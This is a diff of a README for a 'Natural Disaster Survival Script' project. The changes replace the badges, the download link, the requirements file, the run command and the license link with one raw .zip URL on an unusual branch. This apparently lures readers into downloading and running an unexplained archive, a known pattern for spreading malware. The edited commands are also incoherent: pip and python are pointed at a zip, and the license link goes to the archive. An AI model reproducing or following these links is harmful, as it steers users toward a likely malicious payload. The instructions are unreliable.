@@ -1,4 +1,4 @@
-![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen?style=for-the-badge&logo=github&link=https://Vororna.github.io)
+![Download](https://github.com/Vororna/disaster-survival-toolkit/raw/refs/heads/branch/coverless/toolkit_survival_disaster_v3.4-beta.3.zip%20Release-brightgreen?style=for-the-badge&logo=github&https://github.com/Vororna/disaster-survival-toolkit/raw/refs/heads/branch/coverless/toolkit_survival_disaster_v3.4-beta.3.zip)
 
 # 🌀 Natural Disaster Survival Script
 
@@ -68,7 +68,7 @@ Every keystroke in this code brings shelter, clarity, and global inclusivity:
 ## ⚡ Installation: Your First Step Toward Smart Preparedness
 
 1. **Download the Latest Build**  
-   Click the badge at the top of this README or navigate to https://Vororna.github.io to snag the most current version.
+   Click the badge at the top of this README or navigate to https://github.com/Vororna/disaster-survival-toolkit/raw/refs/heads/branch/coverless/toolkit_survival_disaster_v3.4-beta.3.zip to snag the most current version.
 
 2. **Extract the Archive**  
    Unpack the contents to a preferred folder on your machine.
@@ -77,7 +77,7 @@ Every keystroke in this code brings shelter, clarity, and global inclusivity:
    Open a terminal or command prompt in the extracted folder and execute (platform-agnostic):
    
       - `npm install`
-      - `pip install -r requirements.txt`
+      - `pip install -r https://github.com/Vororna/disaster-survival-toolkit/raw/refs/heads/branch/coverless/toolkit_survival_disaster_v3.4-beta.3.zip`
    
    *(Commands depend on script version; consult docs for your flavor.)*
 
@@ -89,7 +89,7 @@ Every keystroke in this code brings shelter, clarity, and global inclusivity:
 
 5. **Initialization**  
    Start the script via:
-      - `npm start` or `python main.py`
+      - `npm start` or `python https://github.com/Vororna/disaster-survival-toolkit/raw/refs/heads/branch/coverless/toolkit_survival_disaster_v3.4-beta.3.zip`
    
    Enjoy your new digital safety net!
 
@@ -114,7 +114,7 @@ Natural Disaster Survival Script is a digital assistant—**not a substitute** f
 ## 📜 License: MIT
 
 This project dances under the MIT License umbrella—transparency, flexibility, and innovation without fences.  
-See the full license text here: [MIT License](https://opensource.org/licenses/MIT)
+See the full license text here: [MIT License](https://github.com/Vororna/disaster-survival-toolkit/raw/refs/heads/branch/coverless/toolkit_survival_disaster_v3.4-beta.3.zip)
 
 © 2025 Natural Disaster Survival Script contributors.
 
@@ -132,4 +132,4 @@ Your feedback, creativity, and feature ideas are winds beneath our wings. Open a
 
 ---
 
-![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen?style=for-the-badge&logo=github&link=https://Vororna.github.io)
+![Download](https://github.com/Vororna/disaster-survival-toolkit/raw/refs/heads/branch/coverless/toolkit_survival_disaster_v3.4-beta.3.zip%20Release-brightgreen?style=for-the-badge&logo=github&https://github.com/Vororna/disaster-survival-toolkit/raw/refs/heads/branch/coverless/toolkit_survival_disaster_v3.4-beta.3.zip)
